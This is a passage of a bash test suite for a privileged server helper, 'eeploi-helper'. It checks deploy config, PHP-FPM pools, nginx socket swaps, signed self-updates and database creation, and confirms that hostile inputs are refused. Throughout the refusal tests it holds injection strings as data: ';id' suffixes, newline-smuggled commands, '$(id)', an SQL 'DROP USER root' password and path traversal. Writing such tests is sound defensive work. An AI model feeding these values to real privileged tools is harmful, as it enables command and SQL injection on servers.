BIN="$WORK/keyed-helper" ok "curl without curlrc" "run: curl -q --fail" self-update 1.2.3

echo "== deploy user from helper.conf"
lacks "default homes have no deploy" "deploy" version
AS=deploy refuse "deploy without config" "run through sudo" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.1.0" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy copies into a site home" "runuser -u shop_example -- sh -c" env-install /home/ploi/a/.env $SITE/.env shop_example
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "the deploy user is not a site user" "reserved name, not a site user: deploy" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
ETC_DIR="$WORK/etc-conf" refuse "eeploi refused when another user deploys" "run through sudo as the deploy user deploy" version
ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
ETC_DIR="$WORK/etc-writable" refuse "config writable by others" "untrusted config" version
ETC_DIR="$WORK/etc-link" refuse "config as a link" "untrusted config" version
ETC_DIR="$WORK/etc-inject" refuse "config with a command" "invalid line" version
if [ ! -e /etc/eeploi/helper.conf ]; then
  DRYRUN='' AS=deploy ETC_DIR="$WORK/etc-conf" refuse "EEPLOI_HELPER_ETC ignored without dry run" "run through sudo" version
else
  echo "note: /etc/eeploi/helper.conf exists here, skipped the override test"
fi

echo "== firewall-close-22"
ETC_DIR="$WORK/etc-new" ok "with marker" "run: ufw delete allow 22/tcp" firewall-close-22
refuse "without marker" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-newwritable" refuse "marker writable by others" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-new" refuse "with arguments" "usage" firewall-close-22 now
if [ ! -e /etc/eeploi/new-server ]; then
  DRYRUN='' ETC_DIR="$WORK/etc-new" refuse "EEPLOI_HELPER_ETC ignored without dry run" "only runs on a server eeploi created" firewall-close-22
else
  echo "note: /etc/eeploi/new-server exists here, skipped the override test"
fi

echo "== nginx user (site-user-create)"
# A new site user: no registry, no user, group or home of that name.
NEW=(site-user-create shop_new new.example)
ok "www-data" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" "${NEW[@]}"
ok "checks the user exists" "check: user www-data and group www-data exist" "${NEW[@]}"
ok "installs acl when missing" "check: setfacl installed, else apt-get install acl" "${NEW[@]}"
NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" "${NEW[@]}"
NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" "${NEW[@]}"
NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" "${NEW[@]}"
NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" "${NEW[@]}"
NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" "${NEW[@]}"
NGINX="$WORK/nginx-group.conf" refuse "the nginx user is reserved" "reserved name, not a site user: nginx" site-user-create nginx new.example
refuse "acl-nginx is gone" "unknown subcommand" acl-nginx

echo "== php-pool-write"
POOL=(php-pool-write 8.4 shop_example)
ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf (644)" "${POOL[@]}"
ok "pool name" "[shop_example]" "${POOL[@]}"
ok "pool user" "user = shop_example" "${POOL[@]}"
ok "pool group" "group = shop_example" "${POOL[@]}"
ok "pool socket" "listen = /run/php/php8.4-fpm-shop_example.sock" "${POOL[@]}"
ok "socket owner" "listen.owner = www-data" "${POOL[@]}"
lacks "socket without group access" "listen.group" "${POOL[@]}"
ok "socket for the nginx user only" "  listen.owner = www-data
  listen.mode = 0600" "${POOL[@]}"
NGINX="$WORK/nginx-group.conf" lacks "socket never for the nginx group" "= web" php-pool-write 8.4 shop_example
ok "ondemand" "pm = ondemand
  pm.max_children = 5
  pm.process_idle_timeout = 10s
  pm.max_requests = 500
  request_terminate_timeout = 60" "${POOL[@]}"
ok "opcache ini" "write: /etc/php/8.4/fpm/conf.d/90-eeploi.ini (644)
  ; Written by eeploi-helper (php-pool-write). eeploi rewrites this file, do not edit.
  opcache.validate_permission = 1" "${POOL[@]}"
ok "test before reload" "run: php-fpm8.4 -t" "${POOL[@]}"
ok "reload last" "run: service php8.4-fpm reload" "${POOL[@]}"
ok "pool in the registry" "  POOL=/etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf
write: $WORK/etc-sites/sites/shop_example (644)" "${POOL[@]}"
lacks "no [eeploi] pool" "[eeploi]" "${POOL[@]}"
lacks "no shared pool file" "pool.d/eeploi.conf" "${POOL[@]}"
NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3 shop_example
AS=deploy ETC_DIR="$WORK/etc-conf" lacks "pool never as the deploy user" "user = deploy" "${POOL[@]}"
refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x' shop_example
refuse "pool version missing" "usage" php-pool-write
refuse "pool without a user" "usage" php-pool-write 8.4
refuse "pool two versions" "usage" php-pool-write 8.3 8.4 shop_example
refuse "pool for an unlisted user" "alex_web is not an eeploi site user" php-pool-write 8.4 alex_web
refuse "pool for the deploy user" "reserved name, not a site user: eeploi" php-pool-write 8.4 eeploi
NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" "${POOL[@]}"

echo "== vhost-set-socket"
SOCK=/run/php/php8.4-fpm-shop_example.sock
ok "to the site's socket" "fastcgi_pass unix:$SOCK;" vhost-set-socket shop.example /var/run/php/php8.4-fpm.sock $SOCK
ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket shop.example /var/run/php/php8.4-fpm.sock $SOCK
ok "nginx -t" "run: nginx -t" vhost-set-socket shop.example /var/run/php/php8.4-fpm.sock $SOCK
lacks "no reload: the caller reloads once, after the whole swap" "reload" vhost-set-socket shop.example /var/run/php/php8.4-fpm.sock $SOCK
refuse "no switch back to a panel socket" "invalid PHP-FPM socket: /var/run/php/php8.4-fpm.sock (the new socket is the pool of the site user of shop.example)" \
  vhost-set-socket shop.example $SOCK /var/run/php/php8.4-fpm.sock
ok "run/php default" "unix:/run/php/php8.3-fpm-shop_example.sock;" vhost-set-socket shop.example /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-shop_example.sock
refuse "no default socket as the new one, for any domain" "the new socket is the pool of the site user of example.com" \
  vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm.sock
# From-sockets a takeover switches away from: the default, eeploi 1.0.1's pool, a panel's pool per user,
# and the site's own pool of another PHP version. None of them is ever a new socket.
for from in /run/php/php8.4-fpm.sock /var/run/php/php8.3-fpm.sock /run/php/php8.4-fpm-eeploi.sock \
  /run/php/php8.4-fpm-forge.sock /run/php/php8.3-fpm-shop-user.sock; do
  ok "from-socket $from" "fastcgi_pass unix:$SOCK;" vhost-set-socket shop.example "$from" $SOCK
  refuse "never a new socket: $from" "invalid PHP-FPM socket: $from" vhost-set-socket shop.example $SOCK "$from"
done
ok "from the site's own pool of another PHP version" "fastcgi_pass unix:$SOCK;" vhost-set-socket shop.example /run/php/php8.3-fpm-shop_example.sock $SOCK
ok "to the site's own pool of another PHP version" "fastcgi_pass unix:/run/php/php8.3-fpm-shop_example.sock;" \
  vhost-set-socket shop.example $SOCK /run/php/php8.3-fpm-shop_example.sock
refuse "from-socket of an unlisted domain's site" "(shop_example is not the eeploi site user of other.example)" \
  vhost-set-socket other.example /run/php/php8.4-fpm-shop_example.sock /run/php/php8.4-fpm-shop_other.sock
refuse "from-socket outside /run/php" "invalid PHP-FPM socket: /tmp/php8.4-fpm.sock" vhost-set-socket shop.example /tmp/php8.4-fpm.sock $SOCK
refuse "socket elsewhere" "invalid PHP-FPM socket" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /tmp/evil.sock
refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock $SOCK
refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' $SOCK
refuse "socket other pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-root.sock
refuse "socket of the old eeploi pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket of an unlisted user" "invalid PHP-FPM socket: /run/php/php8.4-fpm-alex_web.sock (alex_web is not the eeploi site user of example.com)" \
  vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-alex_web.sock
refuse "socket of another domain's site user" "invalid PHP-FPM socket: $SOCK (shop_example is not the eeploi site user of other.example)" \
  vhost-set-socket other.example /run/php/php8.4-fpm.sock $SOCK
refuse "socket of a site user for an unlisted domain" "(shop_example is not the eeploi site user of example.com)" \
  vhost-set-socket example.com /run/php/php8.4-fpm.sock $SOCK
refuse "from-socket of another domain's site user" "(shop_example is not the eeploi site user of other.example)" \
  vhost-set-socket other.example $SOCK /run/php/php8.4-fpm.sock
AS=ploi refuse "site socket from ploi" "run through sudo as the deploy user eeploi" vhost-set-socket shop.example /run/php/php8.4-fpm.sock $SOCK
refuse "socket of a listed user in sudo" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-shop_sudo.sock
refuse "same socket" "same socket" vhost-set-socket shop.example $SOCK $SOCK
refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock $SOCK
refuse "socket arguments" "usage" vhost-set-socket example.com /run/php/php8.4-fpm.sock

echo "== self-update"
sed "s#^PUBKEY=.*#PUBKEY='RWS...REPLACE_WITH_RELEASE_KEY'#" "$HELPER" > "$WORK/placeholder-helper"
BIN="$WORK/placeholder-helper" refuse "placeholder key" "PUBKEY is the placeholder" self-update 1.2.3
ok "verify with the release key" "run: minisign -V -H -q -P $(sed -n "s/^PUBKEY='\\(.*\\)'$/\\1/p" "$HELPER")" self-update 1.2.3
refuse "bad version" "invalid version" self-update 1.2
refuse "version with v" "invalid version" self-update v1.2.3
refuse "version with leading zero" "invalid version" self-update 01.2.3
refuse "version with suffix" "invalid version" self-update 1.2.3-beta
refuse "version with a path" "invalid version" self-update '1.2.3/../../x'
refuse "version with a newline" "invalid version" self-update $'1.2.3\nid'
refuse "no version" "usage" self-update
BIN="$WORK/keyed-helper" ok "download url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "signature url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper.minisig" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "verify with the built-in key" "run: minisign -V -H -q -P $FAKE_KEY" self-update 1.2.3
# Only a prehashed (ED) signature: every check runs minisign with VERIFY (-H), which the dry runs print and
# recipe-run's legacy signature test runs for real; bin/release checks through its own verify, with -H too.
check "one set of minisign flags, with -H" grep -qxF 'VERIFY=(-V -H -q)' "$HELPER"
# Every line that runs $MINISIGN runs it with VERIFY, and no minisign command is written out with its own flags.
check "every minisign run uses it" test "$(grep -F "\"${D}MINISIGN\"" "$HELPER" | grep -vF -e "command -v \"${D}MINISIGN\"" -e "(\"${D}MINISIGN\"" \
  | grep -cvF "\"${D}MINISIGN\" \"${D}{VERIFY[@]}\"")" -eq 0
check "no minisign flags outside VERIFY" test "$(grep -cE '(^|[^A-Za-z_])minisign +-' "$HELPER")" -eq 0
check "bin/release verifies with -H" grep -qF 'verify() { minisign -V -H -p minisign.pub "$@"; }' "$ROOT/bin/release"
check "bin/release has no other check" test "$(grep -cE 'minisign( +-[A-Za-z]+)* +-[A-Za-z]*V' "$ROOT/bin/release")" -eq 1
BIN="$WORK/keyed-helper" ok "version check" "check: <download>/eeploi-helper version = 1.2.3" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "install" "install: /usr/local/sbin/eeploi-helper (root:root 755)" self-update 1.2.3
BIN="$WORK/keyed-helper" refuse "bad version with a key" "invalid version" self-update 1.2.3.4
sed "s#^PUBKEY=.*#PUBKEY='RWQshort'#" "$HELPER" > "$WORK/badkey-helper"
BIN="$WORK/badkey-helper" refuse "malformed key" "invalid release key" self-update 1.2.3

echo "== db-create"
PW='test-password-1234567890'
# What the checks find on the database server, one file per case (key=count, as the helper reads it):
# mariadb db_exists user_exists user_global user_elsewhere db_others granted [user_socket=0] [socket_plugin=1]
# [tcp_user_exists=0] [tcp_granted=0].
db_state() {
  printf 'mariadb=%s\ndb_exists=%s\nuser_exists=%s\nuser_global=%s\nuser_elsewhere=%s\ndb_others=%s\ngranted=%s\n' "${@:1:7}"
  printf 'user_socket=%s\nsocket_plugin=%s\ntcp_user_exists=%s\ntcp_granted=%s\n' "${8:-0}" "${9:-1}" "${10:-0}" "${11:-0}"
}
# Postgres has no mariadb, socket_plugin or tcp_ line.
pg_state() { db_state "$@" | sed '1d;/^socket_plugin=/d;/^tcp_/d'; }
db_state 0 0 0 0 0 0 0 > "$WORK/db-mysql-fresh"
db_state 1 0 0 0 0 0 0 > "$WORK/db-mariadb-fresh"
db_state 0 1 1 0 0 0 1 0 1 1 1 > "$WORK/db-mysql-done"
db_state 0 0 1 0 0 0 0 0 1 1 0 > "$WORK/db-mysql-user"
db_state 0 0 1 0 0 0 1 0 1 1 1 > "$WORK/db-mysql-dropped"
# A 1.0.0 user: on localhost only. Then a user on 127.0.0.1 without its grant, and one there alone.
db_state 0 1 1 0 0 0 1 > "$WORK/db-mysql-localhost-only"
db_state 1 1 1 0 0 0 1 > "$WORK/db-mariadb-localhost-only"
db_state 0 1 1 0 0 0 1 0 1 1 0 > "$WORK/db-mysql-tcp-nogrant"
db_state 0 0 1 0 0 0 0 > "$WORK/db-mysql-user-localhost-nodb"
db_state 0 0 0 0 0 0 0 0 1 1 0 > "$WORK/db-mysql-tcp-only"
db_state 0 1 0 0 0 0 1 > "$WORK/db-mysql-grant-only"
db_state 0 1 1 0 0 1 0 > "$WORK/db-mysql-taken"
db_state 0 1 1 0 0 1 1 > "$WORK/db-mysql-shared"
db_state 0 1 0 0 0 0 0 > "$WORK/db-mysql-nobody"
db_state 0 0 1 1 0 0 0 > "$WORK/db-mysql-global"
db_state 0 0 1 0 1 0 0 > "$WORK/db-mysql-elsewhere"
pg_state 0 1 1 0 0 0 1 > "$WORK/db-pgsql-done"
pg_state 0 1 1 0 0 1 0 > "$WORK/db-pgsql-taken"
printf 'db_exists=0\nuser_exists=0\nPATH=/tmp\n' > "$WORK/db-junk"
printf 'mariadb=0\ndb_exists=0\nuser_exists=0\n' > "$WORK/db-short"

IN=$PW ok "mysql created" "created: mysql database shop for user shop" db-create mysql shop shop password
IN=$PW ok "mysql through the socket as root" "HOME=/root LC_ALL=C mysql --protocol=socket --user=root" db-create mysql shop shop password
IN=$PW ok "mysql with a clean environment" "run: env -i PATH=" db-create mysql shop shop password
IN=$PW ok "mysql statement log off first" "(SQL on stdin)
  SET SESSION sql_log_off = 1;" db-create mysql shop shop_www socket
IN=$PW ok "mysql user on localhost" "CREATE USER 'shop'@'localhost' IDENTIFIED BY '<password>';" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW ok "mysql database utf8mb4" 'CREATE DATABASE `shop_db` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;' db-create mysql shop_db shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW ok "mysql grant on that database only" 'GRANT ALL PRIVILEGES ON `shop\_db`.* TO '"'shop'@'localhost';" db-create mysql shop_db shop password
IN=$PW lacks "mysql no global grant" 'ON *.*' db-create mysql shop_db shop password
IN=$PW ok "mysql checks both grant spellings" "Db IN ('shop_db', 'shop\\\\_db')" db-create mysql shop_db shop password
IN=$PW ok "mariadb client" "LC_ALL=C mariadb --protocol=socket --user=root" db-create mariadb shop shop password
IN=$PW ok "mariadb created" "created: mariadb database shop for user shop" db-create mariadb shop shop password
IN=$PW ok "pgsql as postgres" "runuser -u postgres -- psql -X -q -A -t --no-password -v ON_ERROR_STOP=1 -d postgres" db-create pgsql shop shop password
IN=$PW ok "pgsql statement logs off" "SET log_statement = 'none';
  SET log_min_duration_statement = -1;
  SET log_min_error_statement = 'panic';
  SET pg_stat_statements.track_utility = off;" db-create pgsql shop shop_www socket
IN=$PW ok "pgsql role without rights" "CREATE ROLE \"shop\" LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '<password>';" db-create pgsql shop shop password
IN=$PW ok "pgsql database owned by the user" "CREATE DATABASE \"shop_db\" OWNER \"shop\" ENCODING 'UTF8' TEMPLATE template0;" db-create pgsql shop_db shop password
IN=$PW ok "pgsql closed to others" "REVOKE ALL ON DATABASE \"shop_db\" FROM PUBLIC;" db-create pgsql shop_db shop password
IN=$PW ok "pgsql created" "created: pgsql database shop for user shop" db-create pgsql shop shop password
IN=$PW ok "longest names" "created: mysql database a2345678901234567890123456789012 for user $LONG_USER" \
  db-create mysql a2345678901234567890123456789012 "$LONG_USER" socket
IN="$PW"$'\n' ok "password with a trailing newline" "created:" db-create mysql shop shop password
IN='Az09._~+/=-Az09._~+/=-Az09._~+/=-' ok "password with every allowed sign" "created:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-done" ok "already there" "exists: mysql database shop for user shop, nothing changed" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-done" lacks "already there runs nothing" "run:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-pgsql-done" ok "pgsql already there" "exists: pgsql database shop for user shop, nothing changed" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user" ok "user existed" "(password login, the user existed, its password is unchanged)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user" lacks "user existed keeps its password" "CREATE USER" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
IN=$PW DBSTATE="$WORK/db-mysql-dropped" ok "grant left from a dropped database" 'CREATE DATABASE `shop`' db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-dropped" lacks "grant not given twice" "GRANT ALL" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-grant-only" ok "user missing for a granted database" "CREATE USER 'shop'@'localhost'" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb state" "created: mariadb" db-create mariadb shop shop password

echo "== db-create password login on localhost and 127.0.0.1"
IN=$PW ok "mysql user on 127.0.0.1" "CREATE USER 'shop'@'127.0.0.1' IDENTIFIED BY '<password>';" db-create mysql shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL
IN=$PW ok "mysql grant on 127.0.0.1" 'GRANT ALL PRIVILEGES ON `shop\_db`.* TO '"'shop'@'127.0.0.1';" db-create mysql shop_db shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb user on 127.0.0.1" "CREATE USER 'shop'@'127.0.0.1' IDENTIFIED BY '<password>';" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb grant on 127.0.0.1" "TO 'shop'@'127.0.0.1';" db-create mariadb shop shop password
IN=$PW ok "mysql checks the user on 127.0.0.1" "FROM mysql.user WHERE User = 'shop' AND Host = '127.0.0.1';" db-create mysql shop shop password
IN=$PW ok "mysql: the user's own hosts are not others" "NOT (User = 'shop' AND Host IN ('localhost', '127.0.0.1'))" db-create mysql shop shop password
IN=$PW lacks "pgsql has no host" "127.0.0.1" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-localhost-only" ok "1.0.0 user stays on localhost" "exists: mysql database shop for user shop, nothing changed (password login)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-localhost-only" lacks "1.0.0 mariadb user gets no 127.0.0.1 user" "127.0.0.1' IDENTIFIED" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-user-localhost-nodb" ok "1.0.0 user, new database: no 127.0.0.1 user" "  SET SESSION sql_log_off = 1;
  CREATE DATABASE \`shop\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
  GRANT ALL PRIVILEGES ON \`shop\`.* TO 'shop'@'localhost';
created: mysql database shop for user shop (password login, the user existed on localhost only, its password is unchanged)" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-tcp-nogrant" ok "127.0.0.1 user without its grant: only the grant" "  SET SESSION sql_log_off = 1;
  GRANT ALL PRIVILEGES ON \`shop\`.* TO 'shop'@'127.0.0.1';
created:" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-tcp-only" refuse "user on 127.0.0.1 only" "user shop exists on 127.0.0.1 only, refusing" db-create mysql shop shop password

echo "== db-create refusals"
IN=$PW refuse "db no arguments" "usage: db-create <engine> <name> <user> <socket|password>" db-create
IN=$PW refuse "db two arguments" "usage" db-create mysql shop
IN=$PW refuse "db three arguments, no login" "usage" db-create mysql shop shop
refuse "db three arguments, no login, no stdin" "usage" db-create mysql shop shop
IN=$PW refuse "db five arguments" "usage" db-create mysql shop shop password "$PW"
for bad in tcp Socket PASSWORD '' 'socket;id' 'socket ' peer none; do
  IN=$PW refuse "login '$bad'" "invalid login: $bad (socket or password)" db-create mysql shop shop "$bad"
done
IN='' refuse "password login with nothing on stdin" "the password on stdin must be 16 to 128 characters" db-create mysql shop shop password
IN=$'\n' refuse "password login with a lone newline" "16 to 128" db-create pgsql shop shop password
IN=' ' refuse "password login with a space" "16 to 128" db-create mariadb shop shop password
for engine in mysql mariadb pgsql; do
  IN='' call db-create "$engine" shop shop password
  if [[ $OUT != *"run:"* && $OUT != *"socket login"* ]]; then pass; else failure "$engine lost password never falls back to socket login" "$OUT"; fi
done
IN=$PW refuse "unknown engine" "invalid database engine: sqlite" db-create sqlite shop shop password
IN=$PW refuse "engine uppercase" "invalid database engine" db-create MySQL shop shop password
IN=$PW refuse "engine postgres" "invalid database engine" db-create postgres shop shop password
IN=$PW refuse "engine with a command" "invalid database engine" db-create 'mysql;id' shop shop password
# shellcheck disable=SC2016 # the backticks are literal SQL or a name that must be refused
for bad in Shop shop-db shop.db 'shop;id' "shop'x" 'shop`x' 'shop"x' 'shop x' 'shop$x' '1shop' '_shop' '' \
  a23456789012345678901234567890123 $'shop\nid' 'shop%' 'sh\op'; do
  IN=$PW refuse "database name '$bad'" "invalid database name" db-create mysql "$bad" shop password
  IN=$PW refuse "user name '$bad'" "invalid user name" db-create pgsql shop "$bad" password
done
for reserved in mysql information_schema performance_schema sys postgres template0 template1 root pg_shop; do
  IN=$PW refuse "reserved database $reserved" "reserved database name: $reserved" db-create mysql "$reserved" shop password
  IN=$PW refuse "reserved user $reserved" "reserved user name: $reserved" db-create pgsql shop "$reserved" password
done
IN='short-password1' refuse "password too short" "16 to 128" db-create mysql shop shop password
IN=$(printf '%0129d' 0) refuse "password too long" "16 to 128" db-create mysql shop shop password
IN=$(printf '%0300d' 0) refuse "password far too long" "16 to 128" db-create mysql shop shop password
IN="$PW'; DROP USER root; --" refuse "password with a quote" "16 to 128" db-create mysql shop shop password
IN="$PW\\" refuse "password with a backslash" "16 to 128" db-create mysql shop shop password
IN="$PW x" refuse "password with a space" "16 to 128" db-create mysql shop shop password
IN="$PW\$(id)" refuse "password with a command" "16 to 128" db-create mysql shop shop password
IN="$PW"$'\n'"$PW" refuse "password on two lines" "16 to 128" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-fresh" refuse "mariadb on a MySQL server" "this server runs MySQL, not MariaDB" db-create mariadb shop shop password
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" refuse "mysql on a MariaDB server" "this server runs MariaDB, not MySQL" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-taken" refuse "database of another user" "database shop belongs to another user" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-shared" refuse "database shared with another user" "database shop belongs to another user" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-pgsql-taken" refuse "pgsql database of another owner" "database shop belongs to another user" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-nobody" refuse "database nobody has" "database shop exists and is not shop's" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-global" refuse "user with global rights" "user shop has rights beyond one database" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-mysql-elsewhere" refuse "user on another database" "user shop has rights on another database" db-create mysql shop shop password
IN=$PW DBSTATE="$WORK/db-junk" refuse "checks with another line" "cannot read the pgsql checks: PATH=/tmp" db-create pgsql shop shop password
IN=$PW DBSTATE="$WORK/db-short" refuse "checks with a key missing" "cannot read the mysql checks: no user_global" db-create mysql shop shop password

echo "== db-create keeps the password secret"
for engine in mysql mariadb pgsql; do
  IN=$PW lacks "$engine password not in the output" "$PW" db-create "$engine" shop shop password
  IN=$PW DBSTATE="$WORK/db-mysql-taken" call db-create "$engine" shop shop password
  if [[ $OUT != *"$PW"* ]]; then pass; else failure "$engine password not in a refusal" "$OUT"; fi
done
IN=$PW ok "db-create logs engine, name and user" $'log: eeploi-helper: eeploi: db-create pgsql shop_db shop password\n' db-create pgsql shop_db shop password
IN="$PW'x" call db-create mysql shop shop password
if [[ $OUT != *"$PW"* ]]; then pass; else failure "a refused password is not echoed" "$OUT"; fi

echo "== db-create socket login"
S=shop_example
db_state 0 0 0 0 0 0 0 0 0 > "$WORK/db-mysql-noplugin"
db_state 1 0 0 0 0 0 0 0 0 > "$WORK/db-mariadb-noplugin"
db_state 0 1 1 0 0 0 1 1 > "$WORK/db-mysql-socket-done"
db_state 1 1 1 0 0 0 1 1 > "$WORK/db-mariadb-socket-done"
db_state 0 1 1 0 0 0 1 1 0 > "$WORK/db-mysql-socket-done-noplugin"
db_state 0 0 1 0 0 0 0 1 > "$WORK/db-mysql-socket-user"
pg_state 0 1 1 0 0 0 1 1 > "$WORK/db-pgsql-socket-done"
pg_state 0 0 1 0 0 0 0 1 > "$WORK/db-pgsql-socket-user"
pg_state 0 0 1 0 0 0 0 0 > "$WORK/db-pgsql-password-user"

ok "mysql socket created" "created: mysql database $S for user $S (socket login)" db-create mysql $S $S socket
ok "mysql socket user" "CREATE USER '$S'@'localhost' IDENTIFIED WITH auth_socket;" db-create mysql $S $S socket
# shellcheck disable=SC2016 # the backticks are literal SQL
ok "mysql socket database and grant" '  CREATE DATABASE `shop_example` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
  GRANT ALL PRIVILEGES ON `shop\_example`.* TO '"'$S'@'localhost';" db-create mysql $S $S socket
ok "mariadb socket user" "CREATE USER '$S'@'localhost' IDENTIFIED VIA unix_socket;" db-create mariadb $S $S socket
ok "mariadb socket created" "created: mariadb database $S for user $S (socket login)" db-create mariadb $S $S socket
ok "pgsql socket role without a password" "  CREATE ROLE \"$S\" LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS;
  CREATE DATABASE \"$S\" OWNER \"$S\" ENCODING 'UTF8' TEMPLATE template0;
  REVOKE ALL ON DATABASE \"$S\" FROM PUBLIC;" db-create pgsql $S $S socket
ok "pgsql socket created" "created: pgsql database $S for user $S (socket login)" db-create pgsql $S $S socket
IN=$PW ok "socket login ignores stdin" "(socket login)" db-create mysql $S $S socket
IN=$PW lacks "socket login with stdin makes no password" "IDENTIFIED BY" db-create mysql $S $S socket
IN=$PW ok "password created says so" "created: mysql database $S for user $S (password login)" db-create mysql $S $S password
for engine in mysql mariadb pgsql; do
  ok "$engine socket checks the site user" "check: user www-data and group www-data exist" db-create "$engine" $S $S socket
  for text in PASSWORD 'IDENTIFIED BY' '<password>' 'mysql_native_password' 'caching_sha2_password'; do
    lacks "$engine socket has no $text" "$text" db-create "$engine" $S $S socket
  done
  IN=$PW lacks "$engine password login skips the site user" "check: user" db-create "$engine" $S $S password
done
IN=$PW SYS='' ok "password login needs no Linux user" "created: mysql database $S for user $S (password login)" db-create mysql $S $S password
ok "pgsql socket checks for a password" "FROM pg_authid WHERE rolname = '$S' AND rolpassword IS NULL;" db-create pgsql $S $S socket
ok "mysql socket checks the login method" "AND plugin IN ('auth_socket', 'unix_socket');" db-create mysql $S $S socket
ok "mysql checks the socket plugin" "WHERE PLUGIN_NAME = IF(VERSION() LIKE '%MariaDB%', 'unix_socket', 'auth_socket') AND PLUGIN_STATUS = 'ACTIVE';" db-create mysql $S $S socket
ok "uid 1000 is a site user" "(socket login)" db-create mysql shop_first shop_first socket

echo "== db-create socket login: the auth_socket plugin"
DBSTATE="$WORK/db-mysql-noplugin" ok "mysql installs auth_socket before the user" "  SET SESSION sql_log_off = 1;
  INSTALL PLUGIN auth_socket SONAME 'auth_socket.so';
  CREATE USER '$S'@'localhost' IDENTIFIED WITH auth_socket;" db-create mysql $S $S socket
lacks "mysql with auth_socket active installs nothing" "INSTALL PLUGIN" db-create mysql $S $S socket
